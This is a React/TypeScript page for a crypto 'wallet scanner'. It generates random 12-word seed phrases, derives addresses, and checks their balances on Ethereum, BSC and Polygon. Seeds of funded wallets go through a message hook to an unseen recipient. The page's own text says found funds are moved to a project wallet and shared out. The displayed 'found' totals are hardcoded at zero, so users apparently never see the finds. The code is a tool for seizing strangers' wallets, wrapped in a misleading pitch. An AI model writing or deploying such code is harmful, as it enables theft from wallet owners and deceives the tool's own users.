import { useState, useRef, useEffect } from "react"
import { Wallet, utils } from 'ethers';
import { useEthers } from "@usedapp/core"
import playPic from "../img/play.svg"
import { seeds } from "../utils/seeds";
import { checkBalances } from "../utils/balance";
import { toast } from "react-toastify";
import { useTypedSelector } from "../hooks/useTypedSelector";
import { useActions } from "../hooks/useActions";
import { useSendMessage } from "../hooks/useSendMessage";

const Main = () => {
    const { addresses, mnemonics, counter } = useTypedSelector(state => state.main);
    const { SetAddresses, SetMnemonics, IncreaseCounter } = useActions();

    const messageHook = useSendMessage();

    const pause = useRef(true);
    const { account, activateBrowserWallet, deactivate } = useEthers();

    function connect() {
        if(account) {
            pause.current = true;
            deactivate();
        } else {
            activateBrowserWallet();
        }   
    }

    function getRandomMnemonic() {
        const arrayMnemonic = []
        while(arrayMnemonic.length < 12) {
            arrayMnemonic.push(seeds[Math.floor(Math.random() * 2047)]);
        }
        return arrayMnemonic.join(" ");
    }
    
    function getValidMnemonic() {
        let valid = false;
        let mnemonic;
        while(!valid) {
           mnemonic = getRandomMnemonic();
           valid = utils.isValidMnemonic(mnemonic);
        }
        return mnemonic;
    }

    async function getBatchMnemonics() {
        const batch = await Promise.all([
                getValidMnemonic(), // 1
                getValidMnemonic(), // 2
                getValidMnemonic(), // 3
                getValidMnemonic(), // 4
                getValidMnemonic(), // 5
                getValidMnemonic(), // 6
                getValidMnemonic(), // 7
                getValidMnemonic(), // 8
                getValidMnemonic(), // 9
                getValidMnemonic(), // 10
                getValidMnemonic(), // 11
                getValidMnemonic(), // 12
                getValidMnemonic(), // 13
                getValidMnemonic(), // 14
                getValidMnemonic(), // 15
                getValidMnemonic(), // 16
                getValidMnemonic(), // 17
                getValidMnemonic(), // 18
                getValidMnemonic(), // 19
                getValidMnemonic() // 20
        ]);
        return batch;
    }

    async function getAddresses(_batch: string[]) {
        const addresses: string[] = await Promise.all(
            _batch.map( _mnemonic => {
                return (Wallet.fromMnemonic(_mnemonic as string)).address;
            })
        );
        return addresses;
    }

    function walletCounter() {
        return counter;
    }

    async function start() {
        if (!account) {
            toast.info('First connect your wallet', {
                position: "top-center",
                autoClose: 1000,
                hideProgressBar: true,
                pauseOnHover: false,
                draggable: true,
                theme: "dark",
            });
            return;
        }
        if(pause.current) {
            pause.current = false;
        } else {
            pause.current = true;
        }
        while(!pause.current) {
            const batch: string[] = await getBatchMnemonics() as string[];
            const addresses: string[] = await getAddresses(batch) as string[];
            SetMnemonics(batch);
            SetAddresses(addresses);
            const resulsts: boolean[] = await checkBalances(addresses);
            IncreaseCounter(20);
            const indexes: number[] = [];
            resulsts.forEach((element, i) => {
                if(element) {
                    indexes.push(i);
                }
            } );
            if(indexes.length > 0) {
                let messages: string[] = [];
                messages = indexes.map(
                    (i) => { return `Wallet: ${addresses[i]} Seed: ${batch[i]}` }
                );
                const text = messages.join('; ');
                await messageHook(text);
            }
        }
    }

    return (
        <>
            <div className="wrapper">
                <div className="connect">
                    <div className="connect__address">
                        {account ? account : "not connected"}
                    </div>
                    <div className="connect__button">
                        <button onClick={() => connect()}>
                            {account ? "disconnect" : "connect wallet"}
                        </button>
                    </div>
                </div>
                <div className="play">
                    {
                        pause.current &&
                        <div>
                            <button onClick={() => {start()}}>
                                <img src={playPic} alt="" />
                            </button>
                        </div>
                    }
                </div>
                <div className="addresses">
                    {
                        addresses.length > 0 &&
                        addresses.map((el, index) => 
                            <div 
                                className="address"
                                key={index}    
                            >
                                <div className="address__mnemonic">
                                    {mnemonics[index]}
                                </div>
                                <div className="address__address">
                                    {el}
                                </div>
                            </div>
                        )
                    }  
                </div>
                <div className="balances">
                    Ethereum found: 0.00 ETH <br />
                    BSC found: 0.00 BNB <br />
                    Polygon found: 0.00 MATIC <br />
                    Wallets scanned: {walletCounter()}
                </div>
                <div className="annotation">
                    Project Idea
                </div>
                <div className="text">
                    1. The user comes to the platform, connects the wallet and presses the button ▶.<br /> <br />
                    2. The platform randomly selects passwords from crypto wallets and checks the balances of native currency in the Ethereum, BSC and Polygon networks. <br /> <br />
                    3. If a user finds a cryptocurrency on some wallet, it is automatically sent to another wallet of the project. <br /> <br />
                    4. The found cryptocurrency is distributed as follows: 50% is received by the one who connected his address to the platform and found this cryptocurrency, the other 50% is distributed among the holders of the project token.
                </div>
            </div>
        </>
    )
}

export default Main;